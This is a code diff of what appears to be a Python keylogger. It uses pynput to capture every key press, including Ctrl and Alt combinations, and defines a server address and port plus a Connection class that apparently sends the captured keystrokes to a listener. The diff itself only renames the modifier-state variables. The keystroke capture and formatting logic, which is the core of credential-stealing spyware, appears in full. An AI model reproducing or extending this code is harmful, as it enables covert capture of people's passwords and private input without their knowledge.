@@ -5,24 +5,25 @@ from pynput import keyboard
 SERVER_ADDRESS = "127.0.0.1"
 SERVER_PORT = 6000
 
-CTRL_STATE, ALT_STATE = False, False
+ctrl_state, alt_state = False, False
 
 KEY_MAP = {"enter": "\n", "space": " ", "tab": "\t"}
 
 
 def on_key_press(key) -> None:
-    global CTRL_STATE, ALT_STATE
+    global ctrl_state, alt_state
+    
     pressed = ""
     if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
-        CTRL_STATE = True
+        ctrl_state = True
         return
     elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
-        ALT_STATE = True
+        alt_state = True
     if hasattr(key, "char"):
         if not hasattr(key, "vk"):
             return
-        elif CTRL_STATE or ALT_STATE:
-            pressed = f"[{'CTRL+' if CTRL_STATE else ''}{'ALT+' if ALT_STATE else ''}{chr(key.vk)}]"
+        elif ctrl_state or alt_state:
+            pressed = f"[{'CTRL+' if ctrl_state else ''}{'ALT+' if alt_state else ''}{chr(key.vk)}]"
         else:
             pressed = key.char
     else:
@@ -33,11 +34,12 @@ def on_key_press(key) -> None:
 
 
 def on_key_release(key) -> None:
-    global CTRL_STATE, ALT_STATE
+    global ctrl_state, alt_state
+    
     if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
-        CTRL_STATE = False
+        ctrl_state = False
     elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
-        ALT_STATE = False
+        alt_state = False
 
 
 class Connection:
